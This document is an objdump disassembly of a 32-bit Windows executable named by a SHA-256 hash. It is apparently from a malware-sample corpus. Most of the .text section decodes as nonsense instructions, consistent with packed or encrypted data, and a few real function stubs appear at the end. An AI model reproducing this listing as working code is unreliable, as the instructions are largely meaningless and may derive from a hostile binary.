
e92ff031f999e25ce7f28d69f3c92cb9adeef3adb4431f4f5d43eab1925c7e6e.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	mov    al,0xd9
  4d0002:	scas   eax,DWORD PTR es:[edi]
  4d0003:	mov    ebp,0x6cc2e0c8
  4d0008:	mov    al,0x34
  4d000a:	pop    ds
  4d000b:	pop    esi
  4d000c:	in     eax,dx
  4d000d:	jmp    0x2504:0xe85adaa1
  4d0014:	sub    eax,0x24bab6b0
  4d0019:	test   al,0xd9
  4d001b:	aad    0x8
  4d001d:	and    DWORD PTR [edx-0x4bcc0315],ebp
  4d0023:	test   BYTE PTR [edx],0x50
  4d0026:	adc    dh,bh
  4d0028:	out    0xbd,eax
  4d002a:	out    dx,eax
  4d002b:	add    DWORD PTR [edx],ebx
  4d002d:	ret    0xf4a
  4d0030:	shl    BYTE PTR [ebx-0x759cdbdf],1
  4d0036:	inc    edx
  4d0037:	dec    eax
  4d0038:	or     dh,BYTE PTR [esi+0x15]
  4d003b:	or     BYTE PTR [eax-0x76],bh
  4d003e:	mov    ch,0x22
  4d0040:	jmp    0xb9dd:0xa2b449fa
  4d0047:	mov    ds,WORD PTR [ebx+0x66c1bea3]
  4d004d:	fadd   QWORD PTR [ebp+0x3e]
  4d0050:	adc    DWORD PTR [edi-0x5e],ecx
  4d0053:	mov    ah,0xf5
  4d0055:	mov    al,0x5d
  4d0057:	test   al,0x97
  4d0059:	inc    esp
  4d005a:	pop    esp
  4d005b:	push   0x44a3bb6a
  4d0060:	jg     0x4d0099
  4d0062:	pop    edi
  4d0063:	mov    ebx,0x40e75182
  4d0068:	popa   
  4d0069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d006a:	and    DWORD PTR [edx],0x8
  4d006d:	popf   
  4d006e:	call   0x601868bc
  4d0073:	sbb    edi,edx
  4d0075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0076:	hlt    
  4d0077:	aaa    
  4d0078:	push   es
  4d0079:	mov    cl,0x13
  4d007b:	push   ecx
  4d007c:	add    DWORD PTR [ecx-0x46b9e914],edi
  4d0082:	js     0x4d00d2
  4d0084:	and    ecx,DWORD PTR [edi-0x3ab1ed14]
  4d008a:	data16 in al,dx
  4d008c:	or     BYTE PTR [ebx+0x22],al
  4d008f:	pop    edx
  4d0090:	std    
  4d0091:	aas    
  4d0092:	mov    ds:0xc6006ebe,al
  4d0097:	inc    ecx
  4d0098:	mov    ds:0x22639ff,eax
  4d009d:	pop    es
  4d009e:	(bad)  
  4d009f:	fldcw  WORD PTR [ecx-0x7]
  4d00a2:	cmp    BYTE PTR [eax+ebp*4-0x6f],bh
  4d00a6:	mov    edi,0x406ef889
  4d00ab:	jbe    0x4d0106
  4d00ad:	push   ds
  4d00ae:	jne    0x4d010a
  4d00b0:	mov    eax,ds:0x45f8ae1
  4d00b5:	and    eax,0x7ff0a075
  4d00ba:	dec    esi
  4d00bb:	dec    eax
  4d00bc:	call   0xd5d8:0xc4b7b185
  4d00c3:	jl     0x4d0126
  4d00c5:	jge    0x4d00d9
  4d00c7:	jge    0x4d006d
  4d00c9:	sub    ch,0x6a
  4d00cc:	xchg   esp,eax
  4d00cd:	adc    BYTE PTR [edx],0x95
  4d00d0:	clc    
  4d00d1:	jne    0x4d012b
  4d00d3:	imul   esi,DWORD PTR [ebx-0x76],0xffffffa6
  4d00d7:	or     dh,dl
  4d00d9:	int3   
  4d00da:	pop    eax
  4d00db:	dec    ebx
  4d00dc:	aaa    
  4d00dd:	mov    esi,0x42341cf4
  4d00e2:	pop    edi
  4d00e3:	cmp    ecx,esp
  4d00e5:	repnz les edx,FWORD PTR [esi+eax*4]
  4d00e9:	arpl   WORD PTR [edx-0x3a372f16],dx
  4d00ef:	ins    BYTE PTR es:[edi],dx
  4d00f0:	xor    BYTE PTR [ebp+0x75fa7b52],cl
  4d00f6:	lods   eax,DWORD PTR ds:[esi]
  4d00f7:	test   BYTE PTR [edx+0x73088ed0],dl
  4d00fd:	xor    eax,0xe0ceeed7
  4d0102:	sub    BYTE PTR [ecx],dh
  4d0104:	test   al,0x35
  4d0106:	adc    BYTE PTR [edi],ah
  4d0108:	lea    edi,[esi]
  4d010a:	add    DWORD PTR [esp+ecx*8-0xb],esp
  4d010e:	push   0xc70a9da0
  4d0113:	pop    edi
  4d0114:	fs hlt 
  4d0116:	test   eax,0xac0af0f0
  4d011b:	pop    ds
  4d011c:	pushf  
  4d011d:	jb     0x4d00df
  4d011f:	xor    BYTE PTR [ecx-0x64d9bc09],bh
  4d0125:	pop    es
  4d0126:	adc    ah,dh
  4d0128:	mov    edx,0x9a70f062
  4d012d:	repz call 0x6d46:0x5907f25e
  4d0135:	idiv   esp
  4d0137:	(bad)
  4d013a:	sar    DWORD PTR ds:0x3bbba85e,1
  4d0140:	mov    ebx,0x55e49be2
  4d0145:	aam    0xa5
  4d0147:	das    
  4d0148:	scas   eax,DWORD PTR es:[edi]
  4d0149:	and    ebp,DWORD PTR [edx-0x79]
  4d014c:	fwait
  4d014d:	loop   0x4d0144
  4d014f:	add    ebp,DWORD PTR [ebp-0x374370cf]
  4d0155:	paddb  mm1,QWORD PTR [edx-0x163b8abf]
  4d015c:	cli    
  4d015d:	jb     0x4d012c
  4d015f:	sbb    al,BYTE PTR [edi]
  4d0161:	lea    edi,[ebp+0x66ba85ad]
  4d0167:	cmp    dh,cl
  4d0169:	inc    edi
  4d016a:	cdq    
  4d016b:	lds    edx,FWORD PTR [ebx]
  4d016d:	das    
  4d016e:	jnp    0x4d01a9
  4d0170:	gs loope 0x4d0182
  4d0173:	inc    esi
  4d0174:	test   al,0x21
  4d0176:	jmp    0x4d018d
  4d0178:	test   eax,0xa83ce969
  4d017d:	out    0x6d,eax
  4d017f:	adc    al,0xab
  4d0181:	adc    BYTE PTR [esi-0x408352c4],0xcf
  4d0188:	lods   eax,DWORD PTR ds:[esi]
  4d0189:	mov    dh,0x0
  4d018b:	mov    BYTE PTR [edi-0xc],al
  4d018e:	pop    esi
  4d018f:	add    eax,DWORD PTR [ebp-0x2e03ba01]
  4d0195:	or     al,0x12
  4d0197:	gs mov bl,0xba
  4d019a:	push   ss
  4d019b:	jge    0x4d019c
  4d019d:	sub    eax,0xd20283f5
  4d01a2:	repnz std 
  4d01a4:	jmp    FWORD PTR ds:0xd26a5a0d
  4d01aa:	xor    ah,BYTE PTR [esi-0x3dbcd369]
  4d01b0:	rcr    BYTE PTR [esi-0x48],0xc9
  4d01b4:	xor    DWORD PTR [edx+0x75d03a52],ecx
  4d01ba:	adc    ebp,eax
  4d01bc:	mov    dx,0x3aee
  4d01c0:	fwait
  4d01c1:	popf   
  4d01c2:	pushf  
  4d01c3:	add    eax,0x6a3ed72
  4d01c8:	enter  0x746a,0x6d
  4d01cc:	cmp    eax,0xbb7d8c20
  4d01d1:	imul   eax,DWORD PTR [eax-0x4422b65a],0xffffffe4
  4d01d8:	sub    DWORD PTR [ebx+0x47],ecx
  4d01db:	adc    ah,BYTE PTR [ecx+0x2d]
  4d01de:	shl    DWORD PTR [esi+0x10],1
  4d01e1:	out    dx,eax
  4d01e2:	xchg   esp,eax
  4d01e3:	xor    BYTE PTR [edx],0x27
  4d01e6:	imul   ebx,DWORD PTR [edi+0x1f8e544],0xffffffd5
  4d01ed:	sbb    al,BYTE PTR [edi]
  4d01ef:	(bad)  
  4d01f0:	mov    bh,0x25
  4d01f2:	sub    DWORD PTR [ebx-0x352a1d3e],ecx
  4d01f8:	push   ebx
  4d01f9:	add    eax,0xfaae37a1
  4d01fe:	mov    ebx,0xb88eab91
  4d0203:	xchg   edx,eax
  4d0204:	jb     0x4d01d8
  4d0206:	xchg   edi,eax
  4d0207:	push   ebp
  4d0208:	int3   
  4d0209:	xor    DWORD PTR [eax-0x56],ebp
  4d020c:	lea    ecx,[edi+0x10]
  4d020f:	scas   al,BYTE PTR es:[edi]
  4d0210:	je     0x4d01c4
  4d0212:	out    dx,eax
  4d0213:	push   ecx
  4d0214:	add    bl,BYTE PTR [ebp-0x65]
  4d0217:	mov    dl,0x23
  4d0219:	push   0x69
  4d021b:	jno    0x4d01fb
  4d021d:	xchg   ebp,eax
  4d021e:	xchg   esi,eax
  4d021f:	mov    fs,WORD PTR [edx]
  4d0221:	fisttp WORD PTR [ebp+0x32542f75]
  4d0227:	dec    esi
  4d0228:	xor    dh,BYTE PTR [edi]
  4d022a:	shl    DWORD PTR [ebp+0xca0545],0x3c
  4d0231:	sti    
  4d0232:	xor    eax,0x3efb4aff
  4d0237:	je     0x4d01f3
  4d0239:	test   DWORD PTR [edx+ecx*1+0x53],0x186ab28d
  4d0241:	jbe    0x4d028b
  4d0243:	in     eax,dx
  4d0244:	call   0xd9e4be28
  4d0249:	xchg   ebp,eax
  4d024a:	dec    eax
  4d024b:	mov    edi,0x90b7c027
  4d0250:	xor    bl,cl
  4d0252:	mov    esi,0xcd27d47f
  4d0257:	jle    0x4d0233
  4d0259:	pop    ebp
  4d025a:	repz mul BYTE PTR [edx]
  4d025d:	into   
  4d025e:	add    edx,DWORD PTR [ebp-0x44b26f53]
  4d0264:	test   al,0xd9
  4d0266:	mov    dh,0x95
  4d0268:	mov    al,0x25
  4d026a:	lahf   
  4d026b:	jbe    0x4d0214
  4d026d:	gs addr16 push cs
  4d0270:	sbb    ch,BYTE PTR [ebx]
  4d0272:	sub    DWORD PTR [ebp+0x2d],edi
  4d0275:	in     eax,0x63
  4d0277:	mov    bh,0xd7
  4d0279:	jno    0x4d02c4
  4d027b:	into   
  4d027c:	jmp    0x2dfd:0x17dad202
  4d0283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0284:	pop    edi
  4d0285:	pop    es
  4d0286:	pop    edi
  4d0287:	lahf   
  4d0288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0289:	cli    
  4d028a:	lds    ebx,FWORD PTR [edi+0x5b]
  4d028d:	add    eax,0x6fa5f0ba
  4d0292:	push   0x23
  4d0294:	pop    ebx
  4d0295:	out    0x9d,al
  4d0297:	xchg   DWORD PTR [ecx-0x37293e06],edx
  4d029d:	pop    esi
  4d029e:	xchg   edx,eax
  4d029f:	jns    0x4d022b
  4d02a1:	clc    
  4d02a2:	ins    BYTE PTR es:[edi],dx
  4d02a3:	fadd   QWORD PTR [ebx-0x6d15e9a1]
  4d02a9:	mov    edi,DWORD PTR [ecx+0x77]
  4d02ac:	xor    dl,ch
  4d02ae:	adc    DWORD PTR [edx+ebx*2+0x1d],ebx
  4d02b2:	repnz sbb ebx,esp
  4d02b5:	or     eax,0xc4a31a64
  4d02ba:	stos   DWORD PTR es:[edi],eax
  4d02bb:	imul   esi,ebx,0x9996543b
  4d02c1:	push   edx
  4d02c2:	push   eax
  4d02c3:	push   0x68
  4d02c5:	lods   eax,DWORD PTR ds:[esi]
  4d02c6:	cmp    cl,BYTE PTR [ecx+edi*1+0x53]
  4d02ca:	lds    esi,FWORD PTR [ebx-0x2fb55cb3]
  4d02d0:	xor    eax,0xcf2fb55d
  4d02d5:	xchg   ebp,eax
  4d02d6:	clc    
  4d02d7:	pop    ebx
  4d02d8:	sub    ch,BYTE PTR [esi+0x2]
  4d02db:	cmc    
  4d02dc:	bound  edx,QWORD PTR [esi+0x4e]
  4d02df:	pop    esp
  4d02e0:	icebp  
  4d02e1:	stc    
  4d02e2:	sbb    ebp,DWORD PTR [eax+0x57f40678]
  4d02e8:	mov    DWORD PTR [eax-0x71],edx
  4d02eb:	nop
  4d02ec:	jl     0x4d02ed
  4d02ee:	fidiv  DWORD PTR [ebx-0x13]
  4d02f1:	add    BYTE PTR ds:0x4c56148c,dh
  4d02f7:	js     0x4d030a
  4d02f9:	stos   BYTE PTR es:[edi],al
  4d02fa:	ret    
  4d02fb:	xchg   eax,esi
  4d02fd:	push   esp
  4d02fe:	xchg   edx,eax
  4d02ff:	test   BYTE PTR [eax],dl
  4d0301:	add    DWORD PTR [edx-0x2b],edi
  4d0304:	dec    edx
  4d0305:	lods   al,BYTE PTR ds:[esi]
  4d0306:	mov    cl,0xf2
  4d0308:	or     bh,bl
  4d030a:	push   ss
  4d030b:	(bad)  
  4d030d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d030e:	shl    BYTE PTR ds:0x87941b52,cl
  4d0314:	adc    eax,0x60a86c8e
  4d0319:	jp     0x4d02d3
  4d031b:	push   esi
  4d031c:	mov    al,0x85
  4d031e:	inc    edi
  4d031f:	stos   BYTE PTR es:[edi],al
  4d0320:	sbb    DWORD PTR gs:[edx-0x55f40abc],0xa84510df
  4d032b:	jo     0x4d031d
  4d032d:	jmp    0x4d02ee
  4d032f:	(bad)  
  4d0330:	and    DWORD PTR [eax+eax*2],edx
  4d0333:	(bad)  
  4d0334:	arpl   sp,dx
  4d0336:	les    ecx,FWORD PTR [eax+0x77a35c9d]
  4d033c:	je     0x4d02e1
  4d033e:	pop    esp
  4d033f:	fisttp WORD PTR [esi]
  4d0341:	popa   
  4d0342:	(bad)  
  4d0343:	and    BYTE PTR [ebx],al
  4d0345:	lahf   
  4d0346:	cmp    dh,bl
  4d0348:	push   ebx
  4d0349:	ins    DWORD PTR es:[edi],dx
  4d034a:	(bad)  
  4d034b:	ja     0x4d0307
  4d034d:	in     al,dx
  4d034e:	xchg   edx,eax
  4d034f:	loopne 0x4d02f0
  4d0351:	cwde   
  4d0352:	ss xchg ebp,eax
  4d0354:	jecxz  0x4d031e
  4d0356:	mov    ebx,cs
  4d0358:	or     DWORD PTR [edi],edi
  4d035a:	and    BYTE PTR [edi],dl
  4d035c:	cmc    
  4d035d:	dec    esi
  4d035e:	adc    al,0xec
  4d0360:	iret   
  4d0361:	cmp    al,0xd4
  4d0363:	lahf   
  4d0364:	and    eax,0xdc603c7d
  4d0369:	sub    BYTE PTR [ebx+0x547d248b],0x2e
  4d0370:	cld    
  4d0371:	sub    BYTE PTR [ebx+0x545eedd1],0x2e
  4d0378:	adc    edi,eax
  4d037a:	fs fldz 
  4d037d:	pop    es
  4d037e:	fwait
  4d037f:	push   cs
  4d0380:	jmp    0xa43e687c
  4d0385:	fsub   DWORD PTR [esi]
  4d0387:	inc    ebx
  4d0388:	and    al,0xe2
  4d038b:	mov    esp,0xb051f7f
  4d0390:	and    eax,0xab7e80fa
  4d0396:	iret   
  4d0397:	addr16 inc ecx
  4d0399:	push   esp
  4d039a:	xor    BYTE PTR [eax+0x29206bf3],bl
  4d03a0:	(bad)  
  4d03a1:	fwait
  4d03a2:	mov    al,ds:0x60714fdb
  4d03a7:	sub    dh,dl
  4d03a9:	cmp    ah,BYTE PTR [eax+ebx*4]
  4d03ac:	mov    al,ds:0x58f334b6
  4d03b1:	test   DWORD PTR [eax-0x1b3b537f],edx
  4d03b7:	pop    ebx
  4d03b8:	loopne 0x4d0429
  4d03ba:	aas    
  4d03bb:	pop    ebp
  4d03bc:	sub    edx,DWORD PTR [eax+0x5bea2c0]
  4d03c2:	aas    
  4d03c3:	pop    ebp
  4d03c4:	inc    edx
  4d03c5:	or     bh,BYTE PTR [eax-0x51]
  4d03c8:	adc    eax,0xf409d954
  4d03cd:	stos   DWORD PTR es:[edi],eax
  4d03ce:	es div ch
  4d03d1:	(bad)  
  4d03d3:	or     DWORD PTR [ebx],ecx
  4d03d5:	or     BYTE PTR [edi],0x76
  4d03d8:	cmc    
  4d03d9:	jg     0x4d03cb
  4d03db:	adc    eax,DWORD PTR [eax+0x444d2ba4]
  4d03e1:	lods   eax,DWORD PTR ds:[esi]
  4d03e2:	xchg   ebp,eax
  4d03e3:	fimul  DWORD PTR [ebx]
  4d03e6:	mov    esp,DWORD PTR [edi+eiz*1-0xc]
  4d03ea:	mov    esp,0x45c50a0f
  4d03ef:	lock idiv DWORD PTR [edx]
  4d03f2:	add    al,BYTE PTR [edx+esi*1-0x3083e182]
  4d03f9:	sub    DWORD PTR [ecx],0xdb3752f8
  4d03ff:	pop    es
  4d0400:	scas   eax,DWORD PTR es:[edi]
  4d0401:	enter  0x6c6c,0x6a
  4d0405:	lock rcl DWORD PTR [ebx-0x1f8bf069],cl
  4d040c:	jp     0x4d03b7
  4d040e:	nop
  4d040f:	pop    ds
  4d0410:	xchg   DWORD PTR [esi-0x49],edx
  4d0413:	push   esp
  4d0414:	and    BYTE PTR [edx-0x77],0xab
  4d0418:	jg     0x4d03b7
  4d041a:	mov    esi,0x2ed82c8
  4d041f:	xchg   ecx,eax
  4d0420:	inc    edx
  4d0421:	jae    0x4d03ab
  4d0423:	les    ebp,FWORD PTR [edi]
  4d0425:	push   cs
  4d0426:	push   0xffffffcd
  4d0428:	mov    esp,0x92be0e37
  4d042d:	xor    BYTE PTR [ebp+0x40],bh
  4d0430:	repnz dec esp
  4d0432:	fstp   TBYTE PTR [edi-0x4ada497d]
  4d0438:	(bad)  
  4d0439:	aam    0x1f
  4d043b:	stos   DWORD PTR es:[edi],eax
  4d043c:	mov    al,0xeb
  4d043e:	push   esp
  4d043f:	push   0xffffffda
  4d0441:	pop    edx
  4d0442:	out    0xe7,eax
  4d0444:	loope  0x4d03ef
  4d0446:	sbb    BYTE PTR [eax],bl
  4d0448:	and    BYTE PTR [esi],bh
  4d044a:	(bad)  
  4d044b:	jmp    0x1a19c631
  4d0450:	adc    BYTE PTR [edx+0x2b],al
  4d0453:	adc    bh,BYTE PTR [ecx-0x42b9b607]
  4d0459:	adc    edi,DWORD PTR [ecx-0x3c105fd2]
  4d045f:	sub    eax,0x57985d8c
  4d0464:	ds pop ss
  4d0466:	jae    0x4d04bd
  4d0468:	adc    ebx,DWORD PTR [edi+ecx*2]
  4d046b:	add    eax,0xfe9a6799
  4d0470:	dec    edx
  4d0471:	jl     0x4d043a
  4d0473:	les    edx,FWORD PTR [edi]
  4d0475:	pop    es
  4d0476:	mov    dh,0x87
  4d0478:	jmp    0xa393:0x26605c6c
  4d047f:	lahf   
  4d0480:	jmp    0x8a9a:0xe5b0
  4d0486:	push   ebp
  4d0487:	lds    ecx,FWORD PTR [edi+0x19]
  4d048a:	stos   DWORD PTR es:[edi],eax
  4d048b:	cmp    dh,BYTE PTR [edx+0x4e261847]
  4d0491:	push   cs
  4d0492:	and    al,0x65
  4d0494:	mov    edi,DWORD PTR [ebp+0x51]
  4d0497:	out    0x1,eax
  4d0499:	enter  0x68fe,0x50
  4d049d:	mov    al,ds:0x5fbd9701
  4d04a2:	push   ecx
  4d04a3:	push   0xe807e099
  4d04a8:	repz pop ss
  4d04aa:	in     al,dx
  4d04ab:	mov    esp,0x431420f6
  4d04b0:	or     esp,DWORD PTR [edi]
  4d04b2:	jne    0x4d04b5
  4d04b4:	sbb    bh,cl
  4d04b6:	adc    eax,0xa71374f7
  4d04bb:	or     eax,0x5658ec8d
  4d04c0:	adc    eax,0xeca9a72c
  4d04c5:	pop    esi
  4d04c6:	leave  
  4d04c7:	and    BYTE PTR [esi+0x9],0x37
  4d04cb:	jge    0x4d0474
  4d04cd:	neg    BYTE PTR [ebx]
  4d04cf:	sub    BYTE PTR [edi+0xa8a7149],0x46
  4d04d6:	nop
  4d04d7:	lds    eax,FWORD PTR [edx+0x7232fb89]
  4d04dd:	sbb    al,0x69
  4d04df:	outs   dx,BYTE PTR ds:[esi]
  4d04e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04e1:	jecxz  0x4d0479
  4d04e3:	xchg   ecx,eax
  4d04e4:	jmp    0xdc1c9a45
  4d04e9:	add    ebp,esp
  4d04eb:	sbb    al,0x46
  4d04ed:	(bad)  
  4d04ee:	adc    esp,ebx
  4d04f0:	and    esp,DWORD PTR [esi]
  4d04f2:	out    dx,al
  4d04f3:	sbb    al,0xde
  4d04f5:	or     al,0x8
  4d04f7:	dec    esi
  4d04f8:	and    ebx,DWORD PTR [ebp+0x0]
  4d04fb:	mov    cl,0x33
  4d04fd:	mov    edi,0x9422278a
  4d0502:	je     0x4d0532
  4d0504:	adc    esi,edi
  4d0506:	iret   
  4d0507:	cmc    
  4d0508:	or     cl,BYTE PTR [eax+esi*2]
  4d050b:	inc    esi
  4d050c:	xor    BYTE PTR [eax+edx*2-0x46],0x7f
  4d0511:	mov    esi,DWORD PTR [esi+eax*1]
  4d0514:	div    BYTE PTR [ebp+0x11]
  4d0517:	dec    esi
  4d0518:	pop    esi
  4d0519:	mov    DWORD PTR [edx+ebp*8+0x28],eax
  4d051d:	aaa    
  4d051e:	xor    ebx,edi
  4d0520:	sub    al,0xc8
  4d0522:	and    al,0x1d
  4d0524:	push   esi
  4d0525:	cld    
  4d0526:	jmp    esp
  4d0528:	stos   DWORD PTR es:[edi],eax
  4d0529:	add    ecx,DWORD PTR [ecx-0x27e78571]
  4d052f:	xor    esp,edi
  4d0531:	dec    edi
  4d0532:	xchg   esp,eax
  4d0533:	cmp    BYTE PTR [edx],bl
  4d0535:	mov    al,0xd3
  4d0537:	cmp    DWORD PTR [ebx+0x7e],ebx
  4d053a:	nop
  4d053b:	cs adc esi,ebp
  4d053e:	in     eax,0x34
  4d0540:	inc    edx
  4d0541:	or     dh,BYTE PTR [eax-0x31]
  4d0544:	inc    esp
  4d0545:	mov    dh,0x5
  4d0547:	cmp    DWORD PTR [ecx],edx
  4d0549:	dec    ecx
  4d054a:	push   eax
  4d054b:	(bad)  
  4d054c:	jne    0x4d05c5
  4d054e:	and    al,0x86
  4d0550:	test   BYTE PTR [eax-0x14861cbd],0x22
  4d0557:	test   esi,ebp
  4d0559:	mov    ecx,DWORD PTR [ebp-0x13]
  4d055c:	les    esi,FWORD PTR [bx+di-0x5d98]
  4d0561:	mov    esi,0x31eaa412
  4d0566:	ds mov al,0x81
  4d0569:	push   cs
  4d056a:	sub    al,0x57
  4d056c:	(bad)  
  4d056d:	lock sub DWORD PTR [ebp-0x64d5a07d],esi
  4d0574:	call   0x3f9a3120
  4d0579:	pop    eax
  4d057a:	aam    0xb2
  4d057c:	dec    ebp
  4d057d:	in     al,0x4f
  4d057f:	into   
  4d0580:	jnp    0x4d05b0
  4d0582:	mov    al,0x31
  4d0584:	xchg   BYTE PTR [ebx],bh
  4d0586:	push   edi
  4d0587:	daa    
  4d0588:	outs   dx,BYTE PTR ds:[esi]
  4d0589:	imul   esi,eax,0x9d425963
  4d058f:	sbb    ah,BYTE PTR [ecx-0x47703492]
  4d0595:	cmp    al,0xe5
  4d0597:	xor    esi,ebx
  4d0599:	ret    0xd870
  4d059c:	data16 rcl BYTE PTR [ebx+0x34],0xfc
  4d05a1:	add    al,BYTE PTR ds:0xe352d5cb
  4d05a7:	shr    DWORD PTR [ebp*4-0x679d76e4],cl
  4d05ae:	push   ebx
  4d05af:	cli    
  4d05b0:	pop    edi
  4d05b1:	ins    BYTE PTR es:[edi],dx
  4d05b2:	xor    eax,0x27a3c64a
  4d05b7:	mov    dh,0x3b
  4d05b9:	pop    esp
  4d05ba:	fmul   DWORD PTR [ecx-0x3a]
  4d05bd:	mov    ds:0x5c3bb68f,eax
  4d05c2:	jo     0x4d05d0
  4d05c4:	sub    al,0xd7
  4d05c6:	test   DWORD PTR [edx-0x71],ebx
  4d05c9:	jbe    0x4d059f
  4d05cb:	or     ebx,DWORD PTR [edi]
  4d05cd:	lock pop esi
  4d05cf:	les    edx,FWORD PTR [esi+0x18]
  4d05d2:	and    ch,BYTE PTR [edx]
  4d05d4:	lods   eax,DWORD PTR ds:[esi]
  4d05d5:	neg    ebp
  4d05d7:	aad    0x3f
  4d05d9:	imul   BYTE PTR [edi+0x4f8ec088]
  4d05df:	in     eax,dx
  4d05e0:	xor    bh,ch
  4d05e2:	es dec ebp
  4d05e4:	xor    eax,0x59f829bd
  4d05e9:	ja     0x4d05df
  4d05eb:	ins    DWORD PTR es:[edi],dx
  4d05ec:	push   ebp
  4d05ed:	out    dx,eax
  4d05ee:	bound  esp,QWORD PTR ds:[ecx]
  4d05f1:	icebp  
  4d05f2:	test   bh,ch
  4d05f4:	adc    ebx,eax
  4d05f6:	mov    esp,0x47a0b03b
  4d05fb:	cmp    BYTE PTR [ebx+0x4a],dl
  4d05fe:	mov    al,0xfb
  4d0600:	outs   dx,BYTE PTR ds:[esi]
  4d0601:	mov    ecx,0xa08fe711
  4d0606:	mov    cl,0xa4
  4d0608:	out    dx,eax
  4d0609:	(bad)  
  4d060a:	mov    eax,0x57387a5f
  4d060f:	mov    al,ds:0x60131e87
  4d0614:	jns    0x4d064d
  4d0616:	std    
  4d0617:	sub    bh,BYTE PTR [eax+0x4a]
  4d061a:	out    dx,eax
  4d061b:	(bad)  [edx+0x73b110b5]
  4d0621:	mov    bl,0xf3
  4d0623:	dec    edi
  4d0624:	mov    cs,WORD PTR [ebx+eiz*2+0x3]
  4d0628:	jb     0x4d0633
  4d062a:	mov    ebp,0xc35e8f66
  4d062f:	cdq    
  4d0630:	jb     0x4d05d3
  4d0632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0633:	imul   edi,ecx,0x7097c35e
  4d0639:	mov    eax,ds:0xb611683c
  4d063e:	ret    0x14ed
  4d0641:	retf   
  4d0642:	add    DWORD PTR [edi],edx
  4d0644:	out    dx,al
  4d0645:	xor    al,0xfe
  4d0647:	stos   DWORD PTR es:[edi],eax
  4d0648:	mov    ds:0x59250123,eax
  4d064d:	mov    cl,0xa1
  4d064f:	cmp    al,0x32
  4d0651:	mov    esp,DWORD PTR [edx+0x10]
  4d0654:	sbb    al,0x2d
  4d0656:	dec    ebp
  4d0657:	mov    esp,0xca4c0ec2
  4d065c:	pop    edi
  4d065d:	jge    0x4d065b
  4d065f:	xchg   edi,eax
  4d0660:	xor    ebp,0xffffffdc
  4d0663:	sbb    DWORD PTR [esi-0x39],0x1
  4d0667:	jmp    0xebe7edaa
  4d066c:	cmp    DWORD PTR [esi+ebp*4],0xffffffb0
  4d0670:	push   esi
  4d0671:	xor    edi,edi
  4d0673:	test   ax,0xab98
  4d0677:	push   ds
  4d0678:	sahf   
  4d0679:	shr    esi,cl
  4d067b:	or     ch,BYTE PTR [ebx-0x51]
  4d067e:	sbb    al,0x9c
  4d0680:	dec    edi
  4d0681:	aaa    
  4d0682:	cli    
  4d0683:	fs repnz in al,0x6
  4d0687:	es retf 0xdb63
  4d068b:	mov    eax,ds:0x84815bc4
  4d0690:	aas    
  4d0691:	aaa    
  4d0692:	mov    esi,0x41c8c232
  4d0697:	int    0x3f
  4d0699:	aaa    
  4d069a:	mov    esi,0x41c8c232
  4d069f:	int    0x3f
  4d06a1:	aaa    
  4d06a2:	mov    esi,0x41c8c232
  4d06a7:	int    0x3f
  4d06a9:	aaa    
  4d06aa:	mov    esi,0x41c8c232
  4d06af:	int    0x3f
  4d06b1:	cwde   
  4d06b2:	mov    esi,0x46bfc232
  4d06b7:	int    0x3f
  4d06b9:	inc    esp
  4d06ba:	mov    ecx,0xe2fe7732
  4d06bf:	jp     0x4d06cd
  4d06c1:	sbb    DWORD PTR [edx],edx
  4d06c3:	jmp    0x4e85c0ea
  4d06c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d06c9:	ins    BYTE PTR es:[edi],dx
  4d06ca:	cs shr bh,0xdb
  4d06ce:	jg     0x4d073b
  4d06d0:	mov    ss,WORD PTR [ebx+0x4deb2050]
  4d06d6:	(bad)  
  4d06d7:	jle    0x4d0736
  4d06d9:	fsub   QWORD PTR [edx]
  4d06db:	cmp    al,0xf7
  4d06dd:	lds    eax,FWORD PTR [edx-0x1a]
  4d06e0:	add    DWORD PTR [ebx],edi
  4d06e2:	xchg   ebp,eax
  4d06e3:	inc    BYTE PTR [ebx]
  4d06e5:	mov    al,ds:0x48bcf407
  4d06ea:	mov    cl,0xc5
  4d06ec:	mov    edi,edi
  4d06ee:	push   ebp
  4d06ef:	mov    ebp,esp
  4d06f1:	sub    esp,0x2c
  4d06f4:	lea    edx,ds:0x4d307c
  4d06fa:	adc    DWORD PTR [edx+0x4],0xffffffb4
  4d06fe:	push   edx
  4d06ff:	push   DWORD PTR [edx+0x4]
  4d0702:	push   DWORD PTR [edx+0x14]
  4d0705:	push   eax
  4d0706:	push   ebx
  4d0707:	call   0x4d0fbc
  4d070c:	add    esp,0x10
  4d070f:	pop    edx
  4d0710:	push   edx
  4d0711:	lea    eax,[edx-0x7c]
  4d0714:	push   eax
  4d0715:	call   0x4d15a0
  4d071a:	add    esp,0x4
  4d071d:	test   eax,eax
  4d071f:	jne    0x4d0711
  4d0721:	pop    edx
  4d0722:	push   edx
  4d0723:	push   0x0
  4d0725:	call   0x4d1114
  4d072a:	add    esp,0x4
  4d072d:	pop    edx
  4d072e:	add    esp,0x2c
  4d0731:	pop    ebp
  4d0732:	ret    
  4d0733:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0739:	sub    esp,0x24
  4d073c:	mov    edx,0x4d31a8
  4d0741:	and    DWORD PTR [edx-0x110],edx
  4d0747:	push   edx
  4d0748:	push   0x0
  4d074a:	call   0x4d1220
  4d074f:	add    esp,0x4
  4d0752:	pop    edx
  4d0753:	push   edx
  4d0754:	push   ecx
  4d0755:	push   esi
  4d0756:	push   eax
  4d0757:	push   eax
  4d0758:	call   0x4d0bcc
  4d075d:	add    esp,0x10
  4d0760:	pop    edx
  4d0761:	push   edx
  4d0762:	push   0x0
  4d0764:	call   0x4d1220
  4d0769:	add    esp,0x4
  4d076c:	pop    edx
  4d076d:	add    esp,0x24
  4d0770:	pop    ebp
  4d0771:	ret    
  4d0772:	add    BYTE PTR [eax],al
  4d0774:	mov    edi,edi
  4d0776:	push   ebp
  4d0777:	mov    ebp,esp
  4d0779:	sub    esp,0x44
  4d077c:	lea    eax,ds:0x4d3158
  4d0782:	cmp    eax,0x13c4
  4d0787:	je     0x4d0777
  4d0789:	push   eax
